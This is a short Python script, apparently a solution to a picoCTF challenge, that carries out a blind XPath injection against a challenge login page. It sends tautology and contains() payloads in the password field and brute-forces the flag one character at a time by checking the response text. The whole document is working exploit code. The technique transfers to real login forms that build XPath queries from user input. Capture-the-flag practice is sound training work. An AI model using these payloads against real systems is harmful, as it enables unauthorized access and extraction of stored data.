import string
import requests

chars = string.ascii_lowercase+string.ascii_uppercase+"_"+"{"+string.digits+"}"
url = "http://mercury.picoctf.net:59946/"
data = {'name':'test','pass':'\' or \'1\'=\'1'}


flag="pico"
payload="\' or //*[contains(., \'"
payload_end =  "\')] and \'1\'=\'1"


while "}" not in flag:
	for c in chars:
		data={'name':'test','pass':payload + flag + c + payload_end}
		r=requests.post(url,data)
		#print(c)
		if("on the right path" in r.text):
			flag+=c
			print(flag)
			break
